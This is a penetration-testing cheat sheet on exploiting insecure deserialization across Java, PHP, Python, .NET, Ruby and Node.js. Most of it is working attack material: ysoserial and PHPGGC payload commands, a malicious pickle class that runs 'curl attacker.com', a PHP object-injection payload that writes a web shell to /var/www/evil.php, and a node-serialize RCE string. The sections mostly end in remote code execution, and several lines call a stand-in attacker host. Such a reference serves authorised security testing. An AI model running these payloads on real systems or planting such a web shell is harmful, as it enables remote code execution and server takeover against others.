# Insecure Deserialization

## Overview
Exploitation of insecure deserialization of user-supplied data leading to RCE, authentication bypass, and privilege escalation.

## Detection

### Java Serialization
```
# Binary magic bytes: AC ED 00 05
# Base64: rO0AB... (common in cookies, parameters)
# Content-Type: application/x-java-serialized-object

# Identify libraries in use:
- Apache Commons Collections (cc1-cc7)
- Spring Framework
- JBoss/WildFly
- WebLogic
- Jenkins

# Test with ysoserial:
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com" | base64
```

### PHP Serialization
```
# Format: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"pass";s:4:"test";}
# a: = array, O: = object, s: = string, i: = int, b: = bool, N: = null

# Common magic methods exploited:
__wakeup()   - called on unserialize()
__destruct() - called when object destroyed
__toString() - called when cast to string
__sleep()    - called on serialize()

# Look in: cookies (PHPSESSID, user_data), hidden fields, API parameters
```

### Python Pickle
```
# Pickle format identifiers: \x80\x02 or starts with 'c' module
# Base64 encoded pickles in cookies/params

# Craft malicious pickle:
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl attacker.com',))
payload = base64.b64encode(pickle.dumps(Exploit()))
```

### .NET / C# BinaryFormatter
```
# Binary format, often in ViewState, cookies, SOAP
# Look for __VIEWSTATE, __EVENTVALIDATION parameters
# Libraries: ObjectStateFormatter, LosFormatter, BinaryFormatter

# Tools: ysoserial.net for gadget chains
ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "calc"
```

### Ruby Marshal
```
# Marshal.load on user input
# Gadget chains via ActiveRecord, ActiveSupport

# Craft: Marshal.dump(malicious_object)
```

## Java Exploitation with ysoserial
```
# Generate payloads for different gadget chains:
java -jar ysoserial.jar CommonsCollections1 "cmd" > payload.bin
java -jar ysoserial.jar CommonsCollections2 "cmd" > payload.bin
java -jar ysoserial.jar Spring1 "cmd" > payload.bin
java -jar ysoserial.jar Groovy1 "cmd" > payload.bin
java -jar ysoserial.jar JRMPClient "attacker.com:1099" > payload.bin

# Test each gadget chain as different libraries may be present
```

## PHP Object Injection
```
# Example vulnerable code:
$data = unserialize($_COOKIE['user']);

# Find classes with magic methods in application codebase
# Chain __wakeup → __destruct → file write / RCE

# Example payload for file write:
O:7:"PHPFile":2:{s:4:"name";s:15:"/var/www/evil.php";s:7:"content";s:22:"<?php system($_GET[0]);?>";}

# PHPGGC — PHP Generic Gadget Chains:
phpggc Laravel/RCE7 system whoami
phpggc Symfony/RCE4 system whoami
phpggc Monolog/RCE1 system whoami
```

## ViewState Exploitation (.NET)
```
# If ViewState MAC validation disabled:
# Modify ViewState to inject serialized payload

# If MAC key known (leaked, default):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path "/" --apppath "/" --islegacy

# Test with empty/null MAC key
# Check web.config for machineKey
```

## Node.js / JavaScript
```
# node-serialize package vulnerability
# Serialize function strings that get eval'd on deserialize
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

# serialize-javascript, fast-json-stringify edge cases
```

## Testing Methodology
1. Find serialized data: cookies, hidden fields, request bodies, headers
2. Identify format (base64 decode, check magic bytes)
3. Identify framework/language/libraries
4. Select appropriate gadget chain
5. Generate payload (DNS callback first to confirm deserialization)
6. Escalate to RCE
7. Test blind: use out-of-band (DNS/HTTP callback to Burp Collaborator)

## Blind Detection
```
# Use DNS callback to confirm deserialization without visible output
# ysoserial payload that pings attacker.com
java -jar ysoserial.jar CommonsCollections1 "nslookup attacker.burpcollaborator.net"

# If DNS query received → vulnerable
```

## Tools
- `ysoserial` — Java gadget chains
- `PHPGGC` — PHP gadget chains
- `ysoserial.net` — .NET gadget chains
- Burp Deserialization Scanner extension
- `SerializationDumper` — Java serialization analysis
